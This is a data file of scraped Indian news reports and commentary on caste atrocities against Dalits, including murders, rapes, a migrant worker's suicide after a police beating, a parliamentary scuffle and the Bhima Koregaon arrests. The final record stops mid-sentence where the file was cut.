1,"INTERACTIVE ELECTION MAPS In yet another instance of caste violence, a dalit advocate in Gujarat’s Kutch district was killed, allegedly for his social media posts against Brahmins. Devji Maheshwari, 50, was murdered in broad daylight in Rapar taluka of Kutch district, Gujarat, on September 26. He was a senior activist associated with All India Backward and Minority Communities (BAMCEF) and member of Indian Legal Professionals Associations and was involved in various struggles, including for land rights for dalits. The Kutch police claimed that Maheshwari was killed for his social media posts against Brahmins, but the advocate’s wife has alleged that there was more to it than meets the eye as he was involved in fighting for land and property rights of dalits. Bharat Raval, a 22-year-old resident of Malad, Mumbai and native of Rapar, Kutch, belonging to brahmin community, was arrested by the local police in less than 24 hours of Maheshwari’s murder after he was identified from a CCTV footage. In the footage, Raval is seen waiting outside Maheshwari’s office, follows him inside and runs out minutes later. Maheshwari is seen coming out after Raval, with his shirt soaked in blood, reportedly from multiple stab wounds. He succumbed to his injuries before he could be taken to a hospital. In accordance with local police, Raval confessed that, “he could not take Maheshwari’s anti-Hindu and anti-brahmin Facebook posts anymore.” Reportedly, Maheshwari and Raval had a spat repeatedly over the past one month. Rava had warned Maheshwari to not create trouble as they hailed from same village. He had also threatened Maheshwari in his office once. The last Facebook post by Maheshwari was a video of Waman Meshram, National President of BAMCEF, saying that people belonging to Schedule Castes, Scheduled tribes and Other Backward Classes are not Hindus. Mumbai Police, who arrested Raval and handed him over to Gujarat police, said he travelled on September 23 with an intention to kill Maheshwari. He was arrested under various sections of Schedule Caste and Schedule Tribe (Prevention of Atrocity) Act, charges of murder and criminal conspiracy. Notably, Minaxiben Maheshwari, wife of the deceased advocate, has alleged that the murder was part of larger conspiracy than a spat over social media post. The FIR which was registered based on complaint by Minaxiben Maheshwari stated, “Devji Maheshwari left his residence at around 7.30 am on the day in a private vehicle for Bhuj for a legal matter in connection with a property case that involved Luhar Community Hall (a land dispute between two communities). He returned at around 3.30 left for his office. No lawyer was ready to take the case of the community hall and my husband did. He used to keep the papers related to the case with and tried in vain to lodge a FIR in the matter. The rival party had threatened to kill my husband several times as he was in possession of those papers. It is my suspicion that they hired Bharat Raval to kill him.” Gujarat police has also named eight others in the FIR, of which five have been arrested so far. Noticeably, dalits from Rapar and neighbouring areas erupted in protest and refused to accept the body until accused are arrested. The protestors blocked highways and burnt tyres as a mark of protest. Maheshwari’s body that was kept in a government hospital was accepted later by the family. In January this year, a dalit girl was found hanging from a tree in Sabarkantha district. While family alleged that she was raped and killed by upper caste men of the village, an SIT formed to investigate the case declared victim was neither raped nor murdered. In July, a 27 year old dalit youth was kidnapped and killed by upper caste men of his village for suspicion of theft. He was the sole earner of his family. In 2019, a data compiled by Schedule Caste and Schedule Tribe Cell Gandhinagar, revealed that 568 cases of caste atrocity were registered till May of which 16 murder cases, 30 were of grievously hurt and 36 rape cases. In May 2019, Rajesh Sondarva son of a dalit RTI activist was thrashed to death near Rajkot by men accused of killing his father two years ago. The accused were out on bail. In June 2019, Piyush Sarvaiya, brother Lalji Sarvaiya who was burnt alive by an upper caste mob in 2012, was attacked by one of the convicts accused of killing his brother. The accused who attacked Sarvaiya was out on parole at the time. The same month, Manjibhai Solanki, a 55-year-old deputy Sarpanch was attacked with pipes and rods by upper caste men of his village. Solanki who had reportedly irked the upper caste men as he had helped dalits of the village to lodge cases of atrocity against them, succumbed to his injuries on way to hospital. The third incident of caste atrocity in the state in June 2019 was the murder of 34-year-old Prakash Parmar. Parmar’s brother had lodged a complaint against the men belonging to Darbar (Kshatriya) community who attacked him. On July 8, Haresh Solanki, 22-year-old dalit man was hacked to death allegedly by his wife’s family members who belong to upper caste community. Solanki was attempting to meet his pregnant wife at her parent’s house near Ahmedabad. Between the years 2016 and 2018, dalits have been killed in Gujarat for riding a horse, watching Garba, a traditional Gujarati dance during months of Navratri festival, marrying an upper caste man or woman, raising voice against upper caste men in villages for civil rights. Dalits have been thrashed for wearing mojri, a traditional Indian footwear, sporting a moustache, sporting a photo of Shivaji on his vehicle and riding a horse in one’s own wedding. Dalits have been socially boycotted for attempting to drink water from the only water-well in the village as they are considered ‘untouchables’ by the local villagers."
1,"INTERACTIVE ELECTION MAPS Image Courtesy: iPleaders blog Patna: Two days after a minor Dalit girl, who was allegedly gang-raped in Bihar, died, police have failed to arrest the four named suspects in the case. The girl had tried to end her life but was rescued by her family. She succumbed to her injuries later. With the first of three phases of the Bihar Assembly Elections only 25 days away, Chief Minister Nitish Kumar has instructed top police officials to tackle the incident to ensure that it did not become another Hathras. The state government fears protests by opposition parties and civil society, as has happened in neigbouring Uttar Pradesh. However, the state government has managed to keep the news out of the local media with information about the incident missing in print and TV coverage. A 14-year-old girl from a village in Konch, a community development block in Gaya district, was abducted by four youths when she was returning from a birthday party at a friend’s house on September 29. They gang-raped her for hours. The victim was found in a semi-conscious state near the village the next morning by family members who brought her home. According to them, they looked for her late into the night after she failed to return home. When they asked her why she had not returned, she narrated the incident to them. “She was shaken and deeply pained while sharing the incident with us. She was also crying,” a member of her family said. Soon, she locked herself inside a room. The family initially thought she would open the door after a while. “When an hour passed and she hadn’t opened the door despite our repeated knocks, we sensed something was wrong, broke the door and found her hanging. Fortunately, she was alive and breathing. We immediately took her to a nearby private doctor who referred us to a hospital in Gaya. After her condition deteriorated, the hospital in Gaya advised us to shift her to a private hospital in Patna, where she died on October 1,” another family member said. According to the police, an autopsy was conducted at Gaya Medical College and its results are awaited. Afraid of being chastised in the village, her family did not approach the local police and decided not to lodge a complaint on September 30. Later, when she died and her body was cremated, an FIR was lodged against the four accused – Chandan, Rahul, Tuntun – based on a statement by the victim’s mother. However, the police are denying that it was a case of rape. Sub-Divisional Police Officer Nagendar Singh told NewsClick that the allegations were untrue and that an investigation is on into the case. Konch police station’s officer in-charge, Prashant Kumar Singh, refused to talk about the case and said an investigation was ongoing. However, the assistant sub-inspector of the same police station, Saurav Kumar, told NewsClick that the accused, who are residents of the same village, were absconding after the incident. “The police will arrest them because raids are being conducted,” he said. Realising the gravity of the situation given the upcoming polls, Gaya Senior Superintendent of Police, Rajiv Mishra, visited the village on Friday, met her family and assured them of action against the accused and justice. Over the past 48 hours, three rape cases were reported in Bihar. A 12-year-old physically challenged girl was raped by a married man in a village Gaya. Later, the accused was caught by the villagers, who beat him up and handed them over to the police. On Thursday, a minor girl was gang-raped under Chainpur police station in Kaimur district. The three accused tried to kill her but she managed to survive. Local police have arrested two of the three named accused in the case. With Bihar CM Nitish Kumar hardly missing an opportunity to overstate the law-and-order situation in the state, the opposition is likely to raise it during campaigning."

Ruckus erupted in the Lok Sabha on Monday as BJP and Congress MPs pushed and shoved each other after the Opposition party protested over the issue of the Delhi violence and demanded the resignation of Home Minister Amit Shah. Congress MP Ramya Haridas wrote to Lok Sabha Speaker Om Birla alleging that she was “physically assaulted” by BJP MP Jaskaur Meena, who denied the allegation. In the letter, Haridas wrote, “…I was physically assaulted by the MP Ms Jaskaur Meena. Is this repeatedly happened to me just because I am Dalit and woman? [sic].” Cong MP ramya haridas writes to speaker - says she was pushed by sobjp leaders .. pic.twitter.com/LQUkM5rgKD — pallavi ghosh (@_pallavighosh) March 2, 2020 // <![CDATA[ <script> // ]]> She was also quoted by ANI as saying, “I am a Dalit woman. Today when the Parliament session started at 3pm, I was moving towards the Well of the House to raise the issue of Delhi violence. That time the BJP MP hit me on my shoulder. Parliament is not secure for women Parliament members.” However, Meena, claiming that the allegations were false, said, “As she opened the banner in Lok Sabha, it hit me on my head. I asked her to move ahead. I didn't hit or push her. If she says she is using 'Dalit' word, then I'm also a Dalit woman.” Soon after the session in the Lok Sabha commenced at 2 pm on Monday, Opposition members started raising slogans from the Well against the government. The Lower House was adjourned three times till 4.30 pm as the ruckus continued. The Opposition members went into the section of the treasury benches carrying a black banner, and demanded Shah's resignation, as the Speaker took up the listed business. Parliamentary Affairs minister Pralhad Joshi condemned their ""unruly behaviour"" and asked the Speaker to continue with normal business. Joshi alleged that ""these are the people"" who have provoked the riots. ""They murdered 3,000 people in 1984 (riots) and did no investigation. The priority is to restore peace... but they want to create tension,"" he said. Seeking to restore normalcy in the House, Birla asked Opposition members who were in the Well to take their seats even as they continued to shout the slogan ‘We want justice’. They were also holding placards saying ""Stop hate speech, save our India"". Things took a turn for worse as Congress' Gaurav Gogoi and Ravneet Singh Bittu took a black banner to the Treasury benches where BJP's Sanjay Jaiswal was speaking on 'Vivaad Se Vishwas' Bill. BJP members, including Ramesh Bidhuri and Nishikant Dubey, asked them to return to the Well. The charge by the Congress members angered BJP members, including many from back benches, who rushed towards the Congress members. Members from both sides then began pushing and shoving each other following which the proceedings were adjourned till 3 pm by the Speaker. Union ministers Ravi Shankar Prasad and Smriti Irani were seen trying to pacify the agitated members. Congress president Sonia Gandhi and party leader Rahul Gandhi were present in the House during the uproar. When the House reassembled at 3 pm, some BJP members were seen blocking the way to their side of the Well. BJP's Rama Devi, who was in the Chair, adjourned the House again till 4 pm saying ""whatever you have done is wrong"". But the ruckus continued when the House again met and it was adjourned till 4.30 pm by the Chair. However, the slogan-shouting by the BJP members continued. They chanted slogans like ""Desh ki raksha kaun karega, hum karenge hum karenge (Who will defend the nation, we will do it"" and ""Mahatma Gandhi amar rahein, nakli Gandhi jail mein rahein (Long live Mahatama Gandhi, fake Gandhis stay in jail). Some Opposition members placed a placard demanding Shah's resignation on the Speaker's table but it was swiftly removed by the staff. Earlier, Birla asked leaders of Opposition parties to ensure that their members take their respective seats as the ""people of the country are watching (the proceedings)"". ""This is the temple of democracy. There are certain rules and tradition. You should not come to the Well,"" he said. Birla also said ""as you are responsible representatives of people here, it is your collective responsibility to maintain peace and tranquility."" Amid the din, two bills — The Medical Termination of Pregnancy (Amendment) Bill and Mineral Laws Amendment Bill — were introduced. Also the Direct Tax Vivaad Se Vishwas Bill was moved for consideration and passing.

1,"Speaker Om Birla conducts proceedings in the Lok Sabha during the Budget Session of Parliament in New Delhi on Monday. (PTI) New Delhi: The Congress on Monday accused the government of not allowing a debate in Parliament on the issue of communal violence in Delhi, while also alleging that one of its Dalit MPs was assaulted by a BJP lawmaker. The opposition party said it will continue to protest in Parliament over the communal violence in Delhi as it is its duty to uncover the ""conspiracy"" behind the riots. BJP and Congress members pushed and shoved each other in the Lok Sabha on Monday as opposition parties vehemently protested over the issue of violence in Delhi and demanded resignation of Home Minister Amit Shah. Speaking to reporters after the Lok Sabha was adjourned for the day, Congress' leader in the House Adhir Ranjan Chowdhury said the party demanded that the violence in Delhi be discussed in the Lower House of Parliament as it was a very important issue and the world was talking about it. The party demanded that there should be a debate on the issue with Prime Minister Narendra Modi and Home Minister Amit Shah participating as all Indians want it to happen, Chowdhury said. ""The government should put forward its views on it. We were trying to make this request, but the government did not allow us to do so and kept making one excuse after another,"" he said. ""What is surprising is that when Delhi was burning, the ruling party thought that 'Vivaad Se Vishwas' Bill should be brought. Without asking us, they started discussing the bill,"" the Congress leader said. Chowdhury said ""democracy was torn to shreds"" as the Opposition party was not allowed to air its views. ""The sad part is that a Dalit MP of our party from Kerala was assaulted by ruling party MP. She also started crying and said 'if this happens inside the House to Dalits what will happen outside',"" he said. ""Our protest will continue. It is our duty to uncover who makes hate speeches, who indulge in killings and what is the conspiracy behind the violence,"" Chowdhury said. Congress MP Ramya Haridas on Monday lodged a complaint with Lok Sabha Speaker Om Birla that she was assaulted by BJP MP Jaskaur Meena inside the Lower House of Parliament and sought immediate action over the matter. Earlier, Leader of Opposition in Rajya Sabha Ghulam Nabi Azad alleged that for three days riots continued unabated, but Union ministers did not make any statement and did not visit the riot-affected areas. ""Because of that police also did not act,"" he said. ""The central government wanted that those who are dying, let them die and those who are being burnt alive, let it happen. Hate speeches were given by leaders of the ruling party which meant that the central government was behind the riots,"" he alleged. All business in Parliament should be adjourned to discuss the issue of Delhi violence, Azad said."
1,"Roshan Lal, a 22-year-old migrant worker, committed suicide on Wednesday after he was allegedly humiliated and beaten up by the UP police for breaking quarantine rules. A report by GroundXero.   “Hello Namaskar friends, my name is Roshan Lal. I am very upset today. My only fault is that I stepped out (of the school where he was put in quarantine) to get flour because we did not have anything at my home to eat. A policeman named Anoop Singh has thrashed me so badly that my right hand has stopped working. Perhaps, it is broken now. Don’t ask how helpless I am feeling right now.”   “Despite this, nobody came forward to help me that is why I am taking this extreme step.”   The testimony above has been transcribed from the three recorded audio clips which Roshan Lal, a migrant worker, forwarded to his friend and family members on WhatsApp, minutes before he took the “extreme step” of killing himself by hanging. Roshal Lal body was found hanging from a tree in the school campus, where he was quarantined.  Roshan Lal was a22 year old dalit youth,who worked as a daily wage labourer in Gurgaon. He had returned to his native village, Pipariya under Maigalganj police station, on March 29, six days after Prime Minister Narendra Modi announced the nationwide lockdown, and was kept in a local school under quarantine by village officials. He committed suicide on Wednesday, after he was allegedly humiliated and brutally beaten up by the UP police for breaking quarantine rules.  In one of the audio clips, Roshan Lal can be heard saying,  “My only fault is that I came back from Gurgaon two days ago. My mistake is that I was sitting in the school when I got a call that there was no food at home. My sister-in-law asked me to get some wheat grounded. And I went. That was my mistake – I should have stayed in the school. After that, a constable named Anoop came there and asked if I am Roshan. I said yes. He beat me up severely. My right hand is not working. Then he made me speak to the chowki in-charge. I asked him to help me get treated. He did not help me.”  In another audio clip, Roshan Lal can be heard saying:  “Friends, if there is anyone who does not believe me, they should see my pants. There is only blood. I don’t want to live now. Action should be taken against constable Anoop Kumar Singh. Because of him, I am killing myself.”  Roshan’s elder brother Bankey Lal narrated how his brother managed to reach the village. Bankey Lal said, “He [Roshan Lal] had to walk from Gurgaon till AnandVihar. From there, he boarded a bus to Lucknow. From Lucknow, he hitched rides before walking for the last-mile journey.”  The family members and villagers staged a protest and refused to cremate the body until a case was lodged against the constable. Bankey Lal said, the police had refused to lodge an FIR against the constable. He added, “Just because we are poor doesn’t mean we can be humiliated in the village and nothing will happen to those who are responsible for doing this.”  A senior police officer in the district said Roshan refused to follow quarantine norms. “He was roaming around. That is why he was stopped and maybe, he was slapped a couple of times by the constable,” Lucknow Range Inspector General S K Bhagat said an inquiry had been ordered and action would be taken on the basis of its findings within 48 hours.  Roshan Lal’s story, by no means, is an isolated incident. By now, most of us have seen the photographs and videos of the migrant workers being humiliated across the country by security forces as they trek miles along the highways to reach their homes. To us they are the nameless, faceless multitude – the carriers of the dreaded virus. They are the ‘vector’.  Roshan Lal provides us with a name and a face to this narrative. His story is also one of habitual public humiliation faced by millions at the hands of the state – actualized by the police – and the middle-class civil society. Class exacerbates such instances of humiliation. Caste intensifies it. The two combine together to create a circuit of public humiliation, which lies beyond the imagination of those of us who are participating in “sari challenges” and “quarantine cooking” on social media during the days of the lockdown.  We have more or less maintained ‘social distancing’ from the likes of Roshan Lal. This lockdown and the fear of the virus reaching us have forced us to take notice of them. We wanted them to be locked and quarantined, but in a more “humane” way. But, the visuals of their helplessness,public humiliation and plight haveindeed disturbed our sanitized morality, as theyhave trickled down our social media feeds. Yet, such visuals did not disturb our everyday material existences in anyway. At a time, when “solidarity” and “empathy” have become buzzwords in our social media posts, we did not even try to understand the ways in which such instances of public humiliation create long-standing trauma in those who have to go through them, let alone reach out to them. Because, after all, individuals like Roshan Lal are, for us, mere bodies — the invisible laboring bodies which provide us with the essential goods and services. And, obviously, dispensable. That is why, other than their capacity to perform labour, their stories do not matter.  Roshan Lal took us by our throats to challenge that invisibility. He forced us to see, how behind every instance of public humiliation by the police, there is a bruised, traumatized human ego and self. Yet, what does it say about us, as a society, when in order to communicate to us that every poor dalit youth has a sense of self, he had to kill himself? In our neoliberalized world, where words such as “trauma” and “PTSD” have become much over-used and abused buzzwords amongst a certain section of middle-class youth, what does Roshan Lal’s “trauma” mean? How we are to take into account his trauma, and those of millions like him, as a society? The truth is, in an inequality-ridden casteist, classistsociety like ours, even our notions of trauma must exist in conflict with each other. The truth is, there is no universal understanding of trauma anywhere beyond the inequalities engendered by class, caste, race and gender.  In a couple of days, as we, the obedient citizens, paying heed to the call of the Pied Piper will stand on our balconies, with candles in our hands to ward off the evil virus, the last words of Roshan Lal and Aldrin Lyndog – the marginalized youths – who were forced to take their lives during this lockdown, will come to haunt us. The lockdown, indeed, will leave behind ghosts which will not let themselves be exorcized that easily.  “… see my pants. There is only blood”  “…modi have closed all way 4me nowhere 2go”   Also read :  GroundXero is an attempt to defend facts, reason and truth, as an act of resistance.

1,"Support Scroll.in Support Scroll.in Your support is crucial: India needs independent media and independent media needs you.  Several Dalit leaders, including MPs and MLAs, issued a statement on Monday calling the imminent arrest of activist Anand Teltumbde in the Bhima Koregaon case a “national shame”. On April 8, the Supreme Court had given a week’s time to Teltumbde and Gautam Navlakha to surrender to prison authorities. The order came after the court had rejected their anticipatory bail pleas last month. The counsel for the activists had argued that they are over 65 years old with pre-existing medical conditions, adding that they should be granted more time to surrender. “Going to jail at the time of the Covid-19 virus is virtually a death sentence,” the lawyer had said. However, the top court refused to budge. On Monday, the Dalit leaders, which included Communist Party of India General Secretary D Raja, Independent Gujarat MLA Jignesh Mevani, Congress leader and former MP Udit Raj and Vanchit Bahujan Aghadi chief Prakash Ambedkar among others, said that Teltumbde will surrender on April 14, the birth anniversary of Babasaheb Ambedkar. They described the surrender of Teltumbde and Navlakha on the same day as “shameful for Dalits, Adivasis, OBCs [Other Backward Castes] and minorities on many counts for all of India”. The signatories accused the Centre of trying to “crush the spirit that kept the flame of democracy alive in our midst” and added that even extremely repressive regimes were releasing political prisoners in the face of the coronavirus pandemic. The statement added that the arrest would be an “obnoxious warning of the casteist Manuvadi regime to Dalit, Adivasi, OBC and minority intellectuals not to raise their voices of protest”. They said Teltumbde’s arrest revealed India’s “entrenched casteism”. The Dalit leaders called on the Dalit, OBC, Adivasi and minority leadership to “stand and seek justice” for Teltumbde’s freedom of expression. They asked the public to unite in the name of Ambedkar. Violence broke out between Dalits and Marathas in the village of Bhima Koregaon near Pune on January 1, 2018. This came a day after an event in Pune, called the Elgar Parishad, was organised to commemorate the Battle of Bhima Koregaon in 1818 in which the Dalit soldiers fighting for the British Army defeated the Brahmin Peshwa rulers of the Maratha empire. One person died in violence during a bandh called by Dalit outfits on January 2. Navlakha and Teltumbde were charged under the provisions of the Unlawful Activities Prevention Act and various sections of the Indian Penal Code following the violence at Bhima Koregaon village. The case made by the Pune Police alleged they had Maoist links, and the inquiry was later taken over by the National Investigation Agency. Meanwhile, the petitioners in the Bhima Koregaon case wrote an open letter to Chief Justice of India Sharad Arvind Bobde, alleging that even though 18 months had passed since activists Varavara Rao, Arun Fereira, Vernon Gonsalves, Sudha Bharadwaj and Gautam Navlakha had been arrested, the prosecution had failed to produce any new facts or evidence to support its case. “Despite this, not only have the accused been denied bail and deprived of their liberty, but two new names have been added to their ranks,” the petitioners said. The petitioners – historian Romila Thapar, Prabhat Patnaik, Devaki Jain, Maja Daruwala and Satish Deshpande reminded the Supreme Court that it had in 2018 ruled against the plea for a Special Investigation Team probe in the case, saying the inquiry was at an early stage. “Like all fair-minded citizens, we are shocked that the prosecution has not been held accountable to the spirit of the law,” the petitioners wrote. “We are anguished that our courts have condoned the continued imprisonment of those who have dared to defend the rights of voiceless and marginalised people, and are now allowing this vindictive campaign to be expanded. This is especially inhuman and incomprehensible at a time when the Covid-19 pandemic is threatening our overcrowded jails.” The petitioners urged the chief justice to defend the Constitution and uphold the human rights of the accused through a “positive intervention” in the matter. Global human rights watchdog Amnesty International condemned the Supreme Court’s order directing that Teltumbde and Navlakha be arrested and imprisoned within a week, calling it “cruel and disappointing”. “On one hand, the court acknowledges that overcrowded prisons present a serious threat and recommends the release of prisoners during the pandemic and then it directs two activists who have been critical of the government to surrender before the police and to be sent to jail,” Amnesty International India Executive Director Avinash Kumar said. Amnesty International said Teltumbde and Navlakha have a history of working for the poor and the marginalised sections. “Amnesty India believes that the impending arrests of the two, along with the arrests of the nine activists in the Bhima Koregaon case in 2018, are politically motivated actions that are aimed at chilling peaceful dissent,” it added. Earlier this month, more than 5,000 individuals and over 15 organisations around the world had urged the Centre to delay Teltumbde and Navlakha’s arrest."
1,"Editor’s Note: This month, that is April 2020, FII’s #MoodOfTheMonth is Dalit History, where we invite various articles about historical moments in Dalit movements as well as Dalits in history who have been part of the anti-caste movement in India.. If you’d like to share your write ups, email us at pragya@feminisminindia.com. The period of 1920s till late 1940s saw the upsurge in nationalist movement. The period also saw a rise in anti-caste movements within the nationalist movement. The 1920s were radically transformative decade for the Dalit mass movements in India. Dalit grievances were transforming into an effective political and organisational structure thus shaping Dalit mass politics during the period. The rise of Dalit journalism is seen since 1920s as mainstream media refused to speak about the struggles of the oppressed. With Mahad agitation of 1927 a series of assertive and affirmative mass politics unfolded. The agitation was a visible example of how Dalits had been deprived from public spaces and perpetually subjected to the upper caste violence. The aftermath of Mahad agitation gave the demand of Dalits to be identified separately from the Hindus because there was almost no social cohesion between them and the dominant Brahminical ideology. The question of violence became central in the public sphere as well as the need to have a ‘mouthpiece’ to mobilise public opinions, and leaders like Dr. Ambedkar believed on newspapers to bring about a change in the lives of the oppressed classes. The rise of Dalit journalism is also seen since 1920s as mainstream media refused to speak about the struggles of the oppressed. With Mahad agitation of 1927 a series of assertive and affirmative mass politics unfolded. The agitation was a visible example of how Dalits had been deprived from public spaces and perpetually subjected to the upper caste violence. The leaders knew that mainstream mass media would reflect traditional caste ideology, and hence, there was a need to have a separate media altogether. Thus, the very first newspaper catering to the oppressed classes was ‘Mooknayak‘, on January 31, 1920. It ran for three years and in 1927, and then ‘Bahishkrut Bharat‘ was founded. During the 1920s, Mooknayak and Bahishkrut Bharat took bold positions on several contentious issues pertaining to religion, society and politics. As Bahishkrut Bharat was established as a product of powerful mass agitation during the Mahad Satyagraha in 1927, it later became the mouthpiece of the Ambedkar-led Bahishkrut Hitkarni Sabha. The name of newspapers posed a satire on the prevailing structure of society like the ‘Mooknayak‘ which literally meant ‘leader of the voiceless’ and Bahishkrut Bharat meaning ‘Excluded India’. The title of Bahishkrut Bharat was proposed during a meeting held at Bombay being presided by Dr. Ambedkar. The newspapers were a collective effort of propagating information and form a mouth piece. It received funding from Dalit activists of Konkan and Bombay who we’re participating in the Mahad agitations. Meanwhile, Dr. Ambedkar was involved in writing the reports, commentaries and editorials. These newspapers thus were very important in mobilising the opinion against caste violence in the late 1920s. The important editorials written by Dr. Ambedkar were read publicly in Dalit gatherings and helped in mobilising of Dalits in Western India. In Bahishkrut Bharat, emphasis was laid on the incapability of Hindu society to realise basic social norms and absence of social affinity within caste structure. Various editorials, news reports and testimonies were published on violence against Dalits in western India. Different problems of society and divisions of caste were often criticised in the writings of the papers. They also strongly questioned the Congress and right-wing Hindu nationalists for their indifference and ignorance to the question of caste. Also read: Why Dalit Women’s Contribution Needs Assertion Today Dr. Ambedkar in one of the editorials argued that a nationalist ideology cannot withstand on the notions of ignorance towards caste. He emphasised on the absence of opportunities for individuals to intermix with another which is harmful to national unity. As a result, there are indifferences, hierarchy and violence with no scope for genuine national unity. With the onset of Dalit mass politics in late 1920s, the mainstream media and the alternative press of oppressed became opposite to each other. During the second round table conference when separate electorates and double vote for the depressed classes were announced, the Congress, the press and the mainstream media condemned Dr. Ambedkar for it. These newspapers thus were very important in mobilising the opinion against caste violence in the late 1920s. The important editorials written by Dr. Ambedkar were read publicly in Dalit gatherings and helped in mobilising of Dalits in Western India. Mainstream media had clearly defined its side on who constitutes what and shaped a huge public opinion and mass politics. For the press, the Congress symbolised nationalism and national unity and there was a clear distinction among editors about what constituted nationalism and consequently, ‘Indian’ politics. Thus what was ‘anti national’ or ‘communal’ politics was categorised very systematically. Dalit non-violent protests were never seen as Satyagraha. The Mahad struggle and the Nasik temple entry movement were not considered as Satyagraha by the mainstream media but an attack on social fabric of the country. Thus, the newspapers presented an alternative space and ideas against the dominant hegemonic ideology. However, during the anti-caste struggle and for this alternative view the mainstream media portrayed the anti-caste leaders as ‘traitors’ or ‘dividers’ of the coherent national space. Media played a significant role in the movement and saw emergence of alternative media as a form of protest from the dominant mainstream to put the ‘silenced’ or ‘unheard’ narrative. Study of media of today reveals the same distribution of power within media industry as of those times and the biased or ignored coverage or reports of caste violence. Even after almost 100 years after the first Dalit newspaper was published to this day newsrooms of the mainstream media are dominated by upper caste men. The power structure of media is still the same and thus the mammoth problems are left unnoticed and uncared for by the mainstream media. Also read: The Search For Caste Solidarity: Dalit Women In India And Nepal There is immense potential in the internet to give power to the marginalised communities to have their own media to speak and discuss the issues concerning them freely and openly. Although the forms of alternative media like Veli Vada, Round Table India, Dalit Camera, etc. are changing with increasing participation from the Dalit community but the purpose to stand at par with the mainstream media and offer a counter-hegemonic representation is similar to what it was during the traditional media of newspapers. Apart from change in the medium, the content and the principles are same. Featured Image Source: Velivada Follow FII channels on Youtube and Telegram for latest updates.

1,"INTERACTIVE ELECTION MAPS Protest at Jantar Mantar in Delhi. Photo Credit: Neha Dixit Recommending sacking of UP CM Yogi Adityanath and international inquiry into the Hathras gangrape case, over 30 feminist groups, Dalit organisations and many other diaspora organisations from the UK, along with MPs John McDonnell, Apsana Begum, Kim Johnson, Bell Ribeiro-Addy, and Paula Barker, have written to UN Human Rights Commissioner Michelle Bachelet. The letter asks Bachelet to appeal to Indian PM Modi to dismiss the chief minister of Uttar Pradesh. It says, “[I]n 2019, India reported 4,05,861 cases of crimes against women with Uttar Pradesh topping the list with 59,853 such incidents, according to India’s annual National Crime Record Bureau’s “Crime in India” 2019 report. As for the atrocities against Dalits and other oppressed castes, they too have escalated vastly and oppressor castes have been allowed to act with total impunity. For example, according to the National Crime Record Bureau figures, in 2016, Uttar Pradesh reported the highest number of atrocities against Dalits - 26% of all cases reported.” The groups express concern over the increased attacks on women and Dalits under the “Hindu-supremacist Modi regime with its entrenched Casteist and misogynist ideology”, and say: “Three other sexual assaults and deaths of women and girls took place in UP hardly 24 hours after the Hathras victim's remains had been consigned to flames by the UP police. In Balrampur, a 22-year-old Dalit woman was raped and murdered. In Bhadohi, a 14-year-old Dalit girl was found dead, her face disfigured and head battered - rape is suspected - and in Azamgarh, an 8-year-old girl was raped.” Read the full text of the letter below: Dear Ms Bachelet We are writing to you to express our deep sense of shock and dismay at the terrible events unfolding in Uttar Pradesh, India and to urge you to take action as outlined below. Recent events On 14th September a 19-year-old Dalit woman was gang-raped and assaulted with inhuman violence in Hathras in Uttar Pradesh (UP). Her spine was broken, paralysing all her limbs, her body grievously bruised and her tongue was brutally wounded. The four men who had raped and assaulted her were oppressor caste Thakurs who dominated the village she lived in - a place which continues to practice ‘untouchability’. They had allegedly been ruthlessly harassing her for a considerable length of time, to the extent that she was afraid of leaving her home. But worse was to come. The UP police, initially reluctant to register a case against the four accused, left her lying on the concrete floor of the police station and when she was eventually taken to a hospital she was left in a generic ward. Only after pressure built up was she transferred to the ICU and later to Delhi’s Safdarjung Hospital, where she passed away on 29th September. But even this scale of cruelty was not enough for the police and administration of UP and the local government led by Chief Minister Yogi Adityanath which gives them their orders. On the night of 30th September, they took away her dead body. Her mother’s pleas to be allowed one last look at her were ignored. Then, barricading her family in their house so they could not attend or perform funeral rites, the police forcibly and hurriedly cremated her body at 2:30 am to erase all evidence in the case. Not isolated events What is most shocking is that far from being an isolated crime, this is part of a systematic attack on women and oppressed castes. Three other sexual assaults and deaths of women and girls took place in UP hardly 24 hours after the Hathras victim's remains had been consigned to flames by the UP police. In Balrampur a 22-year-old Dalit woman was raped and murdered. In Bhadohi, a 14-year-old Dalit girl was found dead, her face disfigured and head battered - rape is suspected - and in Azamgarh an 8-year-old girl was raped. While attacks on Dalits and women have escalated vastly all over India since 2014, when the Hindu-supremacist Modi regime with its entrenched Casteist and misogynist ideology came to power, the Adityanath government in UP has seen by far the largest number of attacks and atrocities. For example, in 2019, India reported 4,05,861 cases of crimes against women with Uttar Pradesh topping the list with 59,853 such incidents, according to India’s annual National Crime Record Bureau’s “Crime in India” 2019 report. As for the atrocities against Dalits and other oppressed castes, they too have escalated vastly and oppressor castes have been allowed to act with total impunity. For example, according to the National Crime Record Bureau figures, in 2016, Uttar Pradesh reported the highest number of atrocities against Dalits - 26% of all cases reported. We are deeply concerned about where this is leading India and more specifically the state of Uttar Pradesh. We hope you are able to take action: Urge Prime Minister Narendra Modi to dismiss Yogi Adityanath, Chief Minister of Uttar Pradesh Set up an international enquiry into the Hathras rape case and other rapes and crimes against women, particularly Dalit and oppressed caste women in UP since the Adityanath government came to power in the state.

1,"the fully loaded magazine Dalit scholar Anand Teltumbde along with activist Gautam Navlakha surrendered before the National Investigation Agency (NIA) on Tuesday in connection with the Elgar Parishad-Maoist links case. Anand Teltumbde is the grandson-in-law of Dalit icon Dr B R Ambedkar, whose 129th birth anniversary is being observed on Tuesday. Teltumbde arrived at the NIA office at Cumbala Hill in south Mumbai along with his wife Rama Teltumbde and brother-in-law and Dalit leader Prakash Ambedkar. Navlakha surrendered in New Delhi after the Supreme Court had refused to extend his plea in the wake of the COVID-19 pandemic. The Supreme Court on March 17 this year rejected the pre-arrest bail pleas of Teltumbde and co-accused and civil rights activist Gautam Navlakha, and directed them to surrender before the investigating agency. ""Keeping with the Supreme Court's directive, Anand Teltumbde appeared before the NIA to surrender,"" his lawyer Mihir Desai said. The academician will be placed under arrest and produced before a sessions court by evening, an official said. Civil rights activist Gautam Navlakha surrendered before the National Investigation Agency (NIA) on Tuesday here after the Supreme Court had refused to extend his plea in the wake of the COVID-19 pandemic, officials said. Navlakha, who has been accused under the stringent Unlawful Activities Prevention Act for alleged involvement in the Bhima Koregaon riots in 2018, was asked to surrender by the Supreme Court. Editor of Mumbai-based Economic and Political Weekly journal for years, Navlakha was one of the five human rights activists arrested for alleged Maoist links and involvement in the Bhima Koregaon violence on January 1, 2018 but was granted protection from the arrest by the Supreme Court and the Bombay High Court. A day before his arrest, Teltumbde wrote an open letter saying, ""Taking shelter under the draconian provisions of the UAPA, that renders a person defenseless, I am being jailed."" He added that what happened to him could happen to ""anyone"". ""As I 